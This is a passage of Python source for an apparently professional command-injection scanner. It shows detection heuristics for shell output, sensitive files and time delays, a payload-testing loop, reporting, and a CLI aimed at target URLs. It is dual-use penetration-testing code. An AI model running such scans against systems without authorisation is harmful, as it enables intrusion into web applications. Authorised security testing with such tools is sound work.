                result["detection"] = f"Sensitive file content detected: {pattern}"
                result["confidence"] = "CRITICAL"
                result["evidence"] = self._extract_context(response_text, pattern)
                return True, "output_based_file", result
        
        # 5. Check for Unix usernames
        for username in self.detection_patterns["unix_users"]:
            # Look for username with typical contexts
            if re.search(rf'\b{re.escape(username)}\b', response_lower):
                result["detection"] = f"Unix username detected: {username}"
                result["confidence"] = "HIGH"
                result["evidence"] = self._extract_context(response_text, username)
                return True, "output_based_user", result
        
        # 6. Check for Windows usernames
        for username in self.detection_patterns["windows_users"]:
            if username in response_lower:
                result["detection"] = f"Windows username detected: {username}"
                result["confidence"] = "HIGH"
                result["evidence"] = self._extract_context(response_text, username)
                return True, "output_based_user", result
        
        # 7. Check for Unix paths (multiple occurrences increase confidence)
        path_matches = []
        for path in self.detection_patterns["unix_paths"]:
            if path in response_lower:
                path_matches.append(path)
        
        if len(path_matches) >= 2:
            result["detection"] = f"Multiple Unix paths detected: {', '.join(path_matches[:3])}"
            result["confidence"] = "HIGH"
            result["evidence"] = f"Found {len(path_matches)} path indicators"
            return True, "output_based_paths", result
        
        # 8. Check for Windows paths
        path_matches = []
        for path in self.detection_patterns["windows_paths"]:
            if path in response_lower:
                path_matches.append(path)
        
        if len(path_matches) >= 2:
            result["detection"] = f"Multiple Windows paths detected: {', '.join(path_matches[:3])}"
            result["confidence"] = "HIGH"
            result["evidence"] = f"Found {len(path_matches)} path indicators"
            return True, "output_based_paths", result
        
        # 9. Check for system information
        for info in self.detection_patterns["system_info"]:
            if info in response_lower:
                result["detection"] = f"System information detected: {info}"
                result["confidence"] = "MEDIUM"
                result["evidence"] = self._extract_context(response_text, info)
                return True, "output_based_sysinfo", result
        
        # 10. Check for command output patterns
        for pattern in self.detection_patterns["command_output"]:
            if pattern in response_lower:
                result["detection"] = f"Command output pattern detected: {pattern}"
                result["confidence"] = "MEDIUM"
                result["evidence"] = self._extract_context(response_text, pattern)
                return True, "output_based_cmdout", result
        
        # 11. Check for ping command output (common vulnerable command)
        # If we see ping output patterns, additional command likely executed
        ping_matches = []
        for pattern in self.detection_patterns["ping_output"]:
            if pattern in response_lower:
                ping_matches.append(pattern)
        
        if len(ping_matches) >= 2:
            result["detection"] = f"Ping command output detected with {len(ping_matches)} indicators"
            result["confidence"] = "MEDIUM"
            result["evidence"] = f"Ping patterns: {', '.join(ping_matches[:3])}"
            result["note"] = "Output changed from intended result - possible injection"
            return True, "output_based_ping", result
        
        # 12. Check for network command outputs
        for pattern in self.detection_patterns["network_commands"]:
            if pattern in response_lower:
                result["detection"] = f"Network command output detected: {pattern}"
                result["confidence"] = "MEDIUM"
                result["evidence"] = self._extract_context(response_text, pattern)
                return True, "output_based_network", result
        
        # TIME-BASED DETECTION
        
        # Check for time-based injection indicators
        if any(x in payload.lower() for x in ['sleep', 'timeout', 'ping', 'waitfor']):
            expected_delay = self._extract_delay_from_payload(payload)
            
            if expected_delay and response_time >= (expected_delay - 1):
                deviation = abs(response_time - expected_delay)
                
                if deviation < 2:  # Within 2 seconds
                    result["detection"] = f"Time-based injection confirmed: {response_time:.2f}s (expected ~{expected_delay}s)"
                    result["confidence"] = "HIGH"
                    result["expected_delay"] = expected_delay
                    result["actual_delay"] = response_time
                    result["deviation"] = deviation
                    return True, "time_based", result
            
            # Check against baseline if available
            if self.baseline_response_time:
                time_increase = response_time - self.baseline_response_time
                if time_increase >= (expected_delay - 1):
                    result["detection"] = f"Baseline deviation detected: +{time_increase:.2f}s from baseline"
                    result["confidence"] = "MEDIUM"
                    result["baseline_time"] = self.baseline_response_time
                    result["current_time"] = response_time
                    return True, "time_based_baseline", result
        
        # ERROR-BASED DETECTION
        
        error_indicators = [
            (r"sh:\s*\d+:", "Shell error with line number"),
            (r"bash:\s*line\s*\d+:", "Bash error with line number"),
            (r"syntax error near unexpected token", "Shell syntax error"),
            (r"command not found", "Command not found error"),
            (r"/bin/(ba)?sh:", "Shell interpreter error"),
            (r"cmd\.exe", "Windows command interpreter"),
            (r"'.*' is not recognized as an internal or external command", "Windows command error"),
            (r"permission denied", "Permission denied error"),
            (r"cannot execute", "Execution error"),
            (r"no such file or directory", "File not found error"),
        ]
        
        for pattern, description in error_indicators:
            if re.search(pattern, response_lower, re.IGNORECASE):
                result["detection"] = f"Error-based indicator: {description}"
                result["confidence"] = "MEDIUM"
                result["error_pattern"] = pattern
                result["evidence"] = self._extract_context(response_text, pattern)
                return True, "error_based", result
        
        # LENGTH-BASED DETECTION (weak indicator, needs other evidence)
        
        if self.baseline_response_length:
            length_diff = abs(len(response.content) - self.baseline_response_length)
            length_change_percent = (length_diff / self.baseline_response_length) * 100
            
            # Significant length change (>20%) might indicate injection
            if length_change_percent > 20 and length_diff > 100:
                result["detection"] = f"Significant response length change: {length_change_percent:.1f}% ({length_diff} bytes)"
                result["confidence"] = "LOW"
                result["baseline_length"] = int(self.baseline_response_length)
                result["current_length"] = len(response.content)
                # Don't return True here - need stronger evidence
        
        return False, "none", result
    
    def _extract_delay_from_payload(self, payload: str) -> int:
        """Extract expected delay from time-based payload"""
        # Look for sleep N, timeout N, ping -n N+1 patterns
        sleep_match = re.search(r'sleep\s+(\d+)', payload, re.IGNORECASE)
        if sleep_match:
            return int(sleep_match.group(1))
        
        timeout_match = re.search(r'timeout\s+(\d+)', payload, re.IGNORECASE)
        if timeout_match:
            return int(timeout_match.group(1))
        
        ping_match = re.search(r'ping\s+-n\s+(\d+)', payload, re.IGNORECASE)
        if ping_match:
            return int(ping_match.group(1)) - 1  # ping -n 8 = ~7 seconds
        
        waitfor_match = re.search(r'waitfor\s+/t\s+(\d+)', payload, re.IGNORECASE)
        if waitfor_match:
            return int(waitfor_match.group(1))
        
        return 0
    
    def _extract_context(self, text: str, keyword: str, context_length: int = 50) -> str:
        """Extract context around a keyword for evidence"""
        try:
            # Case-insensitive search
            pattern = re.compile(re.escape(keyword), re.IGNORECASE)
            match = pattern.search(text)
            
            if match:
                start = max(0, match.start() - context_length)
                end = min(len(text), match.end() + context_length)
                context = text[start:end]
                return context.strip()
            return keyword
        except:
            return keyword

    def test_parameter(self, param: str, data: Dict = None, payload_categories: List[str] = None):
        """Test a single parameter with all payloads"""
        if payload_categories is None:
            payload_categories = list(self.payloads.keys())
        
        print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*62}")
        print(f"[*] Testing Parameter: {param}")
        print(f"{'='*62}{Colors.ENDC}")
        
        # Establish baseline
        if not self.baseline_response_time:
            self.establish_baseline(param, data)
        
        tested = 0
        found = 0
        vulnerabilities_this_param = []
        
        for category in payload_categories:
            if category not in self.payloads:
                continue
            
            category_vulns = 0
            print(f"\n{Colors.BLUE}[>] Category: {Colors.BOLD}{category}{Colors.ENDC} ({len(self.payloads[category])} payloads)")
            
            for payload in self.payloads[category]:
                tested += 1
                
                # Show progress for long-running categories
                if self.verbose or tested % 10 == 0:
                    print(f"    Progress: {tested} payloads tested...", end='\r')
                
                is_vulnerable, detection_type, details = self.test_payload(param, payload, data)
                
                if is_vulnerable:
                    found += 1
                    category_vulns += 1
                    
                    vuln = {
                        "parameter": param,
                        "payload": payload,
                        "url_encoded_payload": urllib.parse.quote(payload),  # For easy copy-paste testing
                        "category": category,
                        "detection_type": detection_type,
                        "confidence": details.get('confidence', 'UNKNOWN'),
                        "details": details
                    }
                    self.vulnerabilities.append(vuln)
                    vulnerabilities_this_param.append(vuln)
                    
                    # Color code by confidence
                    if details.get('confidence') == 'CRITICAL':
                        color = Colors.RED + Colors.BOLD
                    elif details.get('confidence') == 'HIGH':
                        color = Colors.RED
                    elif details.get('confidence') == 'MEDIUM':
                        color = Colors.YELLOW
                    else:
                        color = Colors.GREEN
                    
                    print(f"  {color}[+] VULNERABLE - {details.get('confidence', 'UNKNOWN')} CONFIDENCE{Colors.ENDC}")
                    print(f"      Parameter: {Colors.BOLD}{param}{Colors.ENDC}")
                    print(f"      Payload: {Colors.CYAN}{payload}{Colors.ENDC}")
                    print(f"      URL-Encoded: {Colors.CYAN}{urllib.parse.quote(payload)}{Colors.ENDC}")
                    print(f"      Detection: {details.get('detection', 'Unknown')}")
                    print(f"      Type: {detection_type}")
                    
                    if 'evidence' in details:
                        evidence = details['evidence']
                        # Show more evidence if available
                        if len(evidence) > 200:
                            print(f"      Evidence: {evidence[:200]}...")
                        else:
                            print(f"      Evidence: {evidence}")
                    
                    if self.verbose:
                        print(f"      Status Code: {details.get('status_code', 'N/A')}")
                        print(f"      Response Time: {details.get('response_time', 0):.3f}s")
                        print(f"      Response Length: {details.get('response_length', 0)} bytes")
                    
                    print()
                    
                elif self.verbose and tested % 5 == 0:
                    print(f"    [-] {payload[:60]}... - Clean")
            
            # Category summary
            if category_vulns > 0:
                print(f"\n  {Colors.YELLOW}[!] Found {category_vulns} vulnerabilities in {category}{Colors.ENDC}")
        
        # Parameter summary
        print(f"\n{Colors.CYAN}{Colors.BOLD}[*] Parameter Summary: {param}{Colors.ENDC}")
        print(f"    Total Payloads Tested: {tested}")
        print(f"    Vulnerabilities Found: {found}")
        
        if found > 0:
            confidence_counts = {}
            for vuln in vulnerabilities_this_param:
                conf = vuln.get('confidence', 'UNKNOWN')
                confidence_counts[conf] = confidence_counts.get(conf, 0) + 1
            
            print(f"\n    Confidence Breakdown:")
            for conf in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
                if conf in confidence_counts:
                    print(f"      {conf}: {confidence_counts[conf]}")
        
        print(f"{Colors.CYAN}{'='*62}{Colors.ENDC}\n")

    def test_all_parameters(self, params: List[str], data: Dict = None, threads: int = 1, payload_categories: List[str] = None):
        """Test multiple parameters with optional threading"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}Starting scan of {len(params)} parameter(s)...{Colors.ENDC}\n")
        
        if threads > 1:
            print(f"{Colors.YELLOW}[*] Using {threads} concurrent threads{Colors.ENDC}\n")
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {executor.submit(self.test_parameter, param, data, payload_categories): param for param in params}
                for future in as_completed(futures):
                    param = futures[future]
                    try:
                        future.result()
                    except Exception as e:
                        print(f"{Colors.RED}[!] Error testing parameter {param}: {str(e)}{Colors.ENDC}")
        else:
            for param in params:
                self.test_parameter(param, data, payload_categories)

    def export_transactions(self, output_file: str):
        """
        Export all captured HTTP transactions to a file
        Similar to Burp Suite's Save feature
        """
        if not self.response_captures:
            print(f"{Colors.YELLOW}[!] No transactions captured to export{Colors.ENDC}")
            return
        
        export_data = {
            "tool": "Ghost_Injections v2.0",
            "export_time": datetime.now().isoformat(),
            "total_transactions": len(self.response_captures),
            "vulnerable_transactions": len([t for t in self.response_captures if t['vulnerability_detected']]),
            "transactions": self.response_captures
        }
        
        with open(output_file, 'w') as f:
            json.dump(export_data, f, indent=2)
        
        print(f"{Colors.GREEN}[+] Exported {len(self.response_captures)} transactions to: {output_file}{Colors.ENDC}")
    
    def print_transactions_summary(self):
        """Print summary of all captured transactions"""
        if not self.response_captures:
            return
        
        print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*70}{Colors.ENDC}")
        print(f"{Colors.CYAN}{Colors.BOLD}CAPTURED TRANSACTIONS SUMMARY{Colors.ENDC}")
        print(f"{Colors.CYAN}{Colors.BOLD}{'='*70}{Colors.ENDC}\n")
        
        vulnerable_count = len([t for t in self.response_captures if t['vulnerability_detected']])
        
        print(f"{Colors.YELLOW}[*] Total Transactions Captured:{Colors.ENDC} {len(self.response_captures)}")
        print(f"{Colors.YELLOW}[*] Vulnerable Transactions:{Colors.ENDC} {vulnerable_count}")
        
        # Group by parameter
        by_param = {}
        for trans in self.response_captures:
            param = trans['parameter']
            if param not in by_param:
                by_param[param] = {'total': 0, 'vulnerable': 0}
            by_param[param]['total'] += 1
            if trans['vulnerability_detected']:
                by_param[param]['vulnerable'] += 1
        
        print(f"\n{Colors.YELLOW}[*] By Parameter:{Colors.ENDC}")
        for param, stats in by_param.items():
            vuln_str = f"{stats['vulnerable']}/{stats['total']}" if stats['vulnerable'] > 0 else f"{stats['total']}"
            color = Colors.RED if stats['vulnerable'] > 0 else Colors.GREEN
            print(f"    {color}• {param}: {vuln_str} vulnerable{Colors.ENDC}")
        
        # Front-end validation detection
        fe_val_count = len([t for t in self.response_captures 
                           if t['analysis']['front_end_validation']['detected']])
        if fe_val_count > 0:
            print(f"\n{Colors.YELLOW}[!] Front-end validation detected in {fe_val_count} transactions{Colors.ENDC}")
            print(f"    Note: Payloads bypass front-end by sending directly to backend")
        
        print(f"\n{Colors.CYAN}{'='*70}{Colors.ENDC}\n")
    
    def generate_report(self, output_file: str = None):
        """Generate a comprehensive report of findings"""
        
        # Show transactions summary first
        if self.response_captures:
            self.print_transactions_summary()
        
        report = {
            "scan_info": {
                "tool": "Ghost_Injections v2.0",
                "target": self.url,
                "method": self.method,
                "timestamp": datetime.now().isoformat(),
                "session_marker": self.session_marker,
                "total_payloads_tested": self.tested_payloads,
                "transactions_captured": len(self.response_captures),
            },
            "results": {
                "total_vulnerabilities": len(self.vulnerabilities),
                "vulnerabilities": self.vulnerabilities
            },
            "statistics": self._generate_statistics(),
            "http_transactions": {
                "total_captured": len(self.response_captures),
                "vulnerable_transactions": len([t for t in self.response_captures if t['vulnerability_detected']]),
                "front_end_validation_detected": len([t for t in self.response_captures 
                                                      if t['analysis']['front_end_validation']['detected']]),
                "note": "Full transaction details exported separately with --export-transactions flag"
            }
        }
        
        print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*62}{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.CYAN}                    FINAL REPORT{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.CYAN}                 Ghost_Injections v2.0{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.CYAN}{'='*62}{Colors.ENDC}\n")
        
        print(f"{Colors.YELLOW}[*] Scan Information:{Colors.ENDC}")
        print(f"    Target: {self.url}")
        print(f"    Method: {self.method}")
        print(f"    Total Payloads Tested: {self.tested_payloads}")
        print(f"    Scan Duration: {report['statistics']['scan_duration']}")
        print()
        
        if self.vulnerabilities:
            print(f"{Colors.RED}{Colors.BOLD}[!] VULNERABILITIES DETECTED: {len(self.vulnerabilities)}{Colors.ENDC}\n")
            
            # Group by confidence level
            by_confidence = {}
            for vuln in self.vulnerabilities:
                conf = vuln.get('confidence', 'UNKNOWN')
                if conf not in by_confidence:
                    by_confidence[conf] = []
                by_confidence[conf].append(vuln)
            
            # Display by confidence level
            for conf_level in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'UNKNOWN']:
                if conf_level in by_confidence:
                    vulns = by_confidence[conf_level]
                    
                    if conf_level == 'CRITICAL':
                        color = Colors.RED + Colors.BOLD
                    elif conf_level == 'HIGH':
                        color = Colors.RED
                    elif conf_level == 'MEDIUM':
                        color = Colors.YELLOW
                    else:
                        color = Colors.GREEN
                    
                    print(f"{color}[{conf_level}] {len(vulns)} Vulnerabilities:{Colors.ENDC}")
                    
                    for i, vuln in enumerate(vulns[:5], 1):  # Show first 5 of each level
                        print(f"\n  {i}. Parameter: {vuln['parameter']}")
                        print(f"     Category: {vuln['category']}")
                        print(f"     Detection: {vuln['detection_type']}")
                        # Show full payload for manual testing (no truncation)
                        print(f"     Payload: {Colors.CYAN}{vuln['payload']}{Colors.ENDC}")
                        # Also show URL-encoded version for easy copy-paste
                        encoded_payload = urllib.parse.quote(vuln['payload'])
                        print(f"     URL-Encoded: {Colors.CYAN}{encoded_payload}{Colors.ENDC}")
                        print(f"     Finding: {vuln['details'].get('detection', 'N/A')}")
                    
                    if len(vulns) > 5:
                        print(f"\n  ... and {len(vulns) - 5} more {conf_level} confidence findings")
                    print()
            
            # Statistics
            print(f"\n{Colors.CYAN}[*] Vulnerability Statistics:{Colors.ENDC}")
            stats = report['statistics']
            
            if stats['by_detection_type']:
                print(f"\n    By Detection Type:")
                for det_type, count in stats['by_detection_type'].items():
                    print(f"      {det_type}: {count}")
            
            if stats['by_category']:
                print(f"\n    By Payload Category:")
                for category, count in sorted(stats['by_category'].items(), key=lambda x: x[1], reverse=True)[:5]:
                    print(f"      {category}: {count}")
            
            if stats['by_confidence']:
                print(f"\n    By Confidence Level:")
                for conf, count in stats['by_confidence'].items():
                    print(f"      {conf}: {count}")
            
            # Affected parameters
            affected_params = set(v['parameter'] for v in self.vulnerabilities)
            print(f"\n    Affected Parameters: {', '.join(affected_params)}")
            
        else:
            print(f"{Colors.GREEN}[+] No command injection vulnerabilities detected.{Colors.ENDC}\n")
            print(f"{Colors.YELLOW}[*] This does not guarantee the application is secure.{Colors.ENDC}")
            print(f"{Colors.YELLOW}[*] Manual testing is always recommended.{Colors.ENDC}\n")
        
        if output_file:
            with open(output_file, 'w') as f:
                json.dump(report, f, indent=4)
            print(f"\n{Colors.GREEN}[+] Detailed JSON report saved to: {output_file}{Colors.ENDC}")
        
        print(f"\n{Colors.CYAN}{'='*62}{Colors.ENDC}")
        print(f"{Colors.BOLD}Scan completed at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.ENDC}")
        print(f"{Colors.CYAN}{'='*62}{Colors.ENDC}\n")
        
        return report
    
    def _generate_statistics(self) -> Dict:
        """Generate statistics from vulnerabilities"""
        stats = {
            "by_detection_type": {},
            "by_category": {},
            "by_confidence": {},
            "by_parameter": {},
            "scan_duration": "N/A"
        }
        
        for vuln in self.vulnerabilities:
            # By detection type
            det_type = vuln.get('detection_type', 'unknown')
            stats['by_detection_type'][det_type] = stats['by_detection_type'].get(det_type, 0) + 1
            
            # By category
            category = vuln.get('category', 'unknown')
            stats['by_category'][category] = stats['by_category'].get(category, 0) + 1
            
            # By confidence
            confidence = vuln.get('confidence', 'UNKNOWN')
            stats['by_confidence'][confidence] = stats['by_confidence'].get(confidence, 0) + 1
            
            # By parameter
            param = vuln.get('parameter', 'unknown')
            stats['by_parameter'][param] = stats['by_parameter'].get(param, 0) + 1
        
        return stats


def main():
    parser = argparse.ArgumentParser(
        description="Ghost_Injections v2.0 - Advanced Command Injection Testing Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic GET parameter test
  python3 ghost_injections.py -u "http://target.com/ping?host=127.0.0.1" -p host
  
  # POST request with data
  python3 ghost_injections.py -u "http://target.com/api/execute" -m POST -p cmd -d "cmd=test&other=value"
  
  # Multiple parameters with proxy (Burp Suite)
  python3 ghost_injections.py -u "http://target.com/search" -p q,filter,sort --proxy http://127.0.0.1:8080
  
  # Authenticated testing with custom headers
  python3 ghost_injections.py -u "http://target.com/admin/cmd" -p command -H "Authorization:Bearer TOKEN" -c "session=abc123"
  
  # Full scan with output report
  python3 ghost_injections.py -u "http://target.com/api" -p input -t 5 -o report.json -v
  
  # Test specific categories only
  python3 ghost_injections.py -u "http://target.com/ping" -p host --categories "time_based_unix_sleep,output_marker_basic"

Ghost Ops Security - Professional Penetration Testing
        """
    )
    
    # Required arguments
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--params", required=True, help="Parameters to test (comma-separated)")
    
    # Request configuration
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"], 
                       help="HTTP method (default: GET)")
    parser.add_argument("-d", "--data", help="POST data (format: key=value&key2=value2)")
    parser.add_argument("-H", "--headers", 
                       help="Custom headers (format: 'Header1:Value1,Header2:Value2')")
    parser.add_argument("-c", "--cookies", 
                       help="Cookies (format: 'name1=value1,name2=value2')")
    parser.add_argument("--user-agent", help="Custom User-Agent string")
    
    # Scan configuration
    parser.add_argument("--timeout", type=int, default=15, 
                       help="Request timeout in seconds (default: 15)")
    parser.add_argument("--delay", type=float, default=0, 
                       help="Delay between requests in seconds (default: 0)")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
    parser.add_argument("-t", "--threads", type=int, default=1, 
                       help="Number of concurrent threads (default: 1)")
    
    # Output and verbosity
    parser.add_argument("-o", "--output", help="Output file for JSON report")
    parser.add_argument("--export-transactions", help="Export captured HTTP transactions to file (like Burp Suite)")
    parser.add_argument("-v", "--verbose", action="store_true", 
                       help="Verbose output (show all payloads tested and full HTTP transactions)")
    
    # Payload selection
    parser.add_argument("--categories", 
                       help="Payload categories to test (comma-separated, default: all)")
    parser.add_argument("--list-categories", action="store_true",
                       help="List all available payload categories and exit")
    
    args = parser.parse_args()
    
    # List categories if requested
    if args.list_categories:
        tester = GhostInjections(url="http://example.com", method="GET")
        print(f"\n{Colors.CYAN}{Colors.BOLD}Available Payload Categories:{Colors.ENDC}\n")
        for category, payloads in sorted(tester.payloads.items()):
            print(f"  {Colors.YELLOW}{category:30s}{Colors.ENDC} - {len(payloads)} payloads")
        print(f"\n{Colors.CYAN}Total: {len(tester.payloads)} categories, {sum(len(v) for v in tester.payloads.values())} payloads{Colors.ENDC}\n")
        sys.exit(0)
    
    # Parse headers
    headers = {}
    if args.headers:
        for header in args.headers.split(','):
            if ':' in header:
                key, value = header.split(':', 1)
                headers[key.strip()] = value.strip()
    
    # Parse cookies
    cookies = {}
    if args.cookies:
        for cookie in args.cookies.split(','):
            if '=' in cookie:
                key, value = cookie.split('=', 1)
                cookies[key.strip()] = value.strip()
    
    # Parse POST data
    post_data = {}
    if args.data:
        for item in args.data.split('&'):
            if '=' in item:
                key, value = item.split('=', 1)
                post_data[key] = value
    
    # Parse proxy
    proxy = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    
    # Parse parameters
    params = [p.strip() for p in args.params.split(',')]
    
    # Validate parameters (shouldn't contain = or values)
    for param in params:
        if '=' in param:
            print(f"{Colors.RED}[!] Error: Parameter should not contain '=' or values{Colors.ENDC}")
            print(f"{Colors.YELLOW}[*] Incorrect: -p ip=127.0.0.1{Colors.ENDC}")
            print(f"{Colors.GREEN}[*] Correct:   -p ip{Colors.ENDC}")
            print(f"{Colors.YELLOW}[*] The tool will test different values automatically{Colors.ENDC}")
            sys.exit(1)
    
    # Parse categories
    categories = [c.strip() for c in args.categories.split(',')] if args.categories else None
    
    # Validate categories
    if categories:
        tester_temp = GhostInjections(url="http://example.com", method="GET")
        invalid_cats = [c for c in categories if c not in tester_temp.payloads]
        if invalid_cats:
            print(f"{Colors.RED}[!] Invalid categories: {', '.join(invalid_cats)}{Colors.ENDC}")
            print(f"{Colors.YELLOW}[*] Use --list-categories to see available categories{Colors.ENDC}")
            sys.exit(1)
    
    # Create tester instance
    tester = GhostInjections(
        url=args.url,
        method=args.method,
        headers=headers,
        cookies=cookies,
        timeout=args.timeout,
        proxy=proxy,
        delay=args.delay,
        verbose=args.verbose,
        user_agent=args.user_agent
    )
    
    # Print banner
    tester.print_banner()
    
    # Run tests
    start_time = time.time()
    try:
        tester.test_all_parameters(params, post_data, args.threads, categories)
        
        # Calculate scan duration
        scan_duration = time.time() - start_time
        tester._generate_statistics()['scan_duration'] = f"{scan_duration:.2f} seconds"
        
        tester.generate_report(args.output)
        
        # Export HTTP transactions if requested
        if args.export_transactions:
            tester.export_transactions(args.export_transactions)
        
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.ENDC}")
        print(f"{Colors.CYAN}[*] Generating partial report...{Colors.ENDC}\n")
        if tester.vulnerabilities:
            tester.generate_report(args.output)
        if args.export_transactions and tester.response_captures:
            tester.export_transactions(args.export_transactions)
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[!] Fatal error: {str(e)}{Colors.ENDC}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
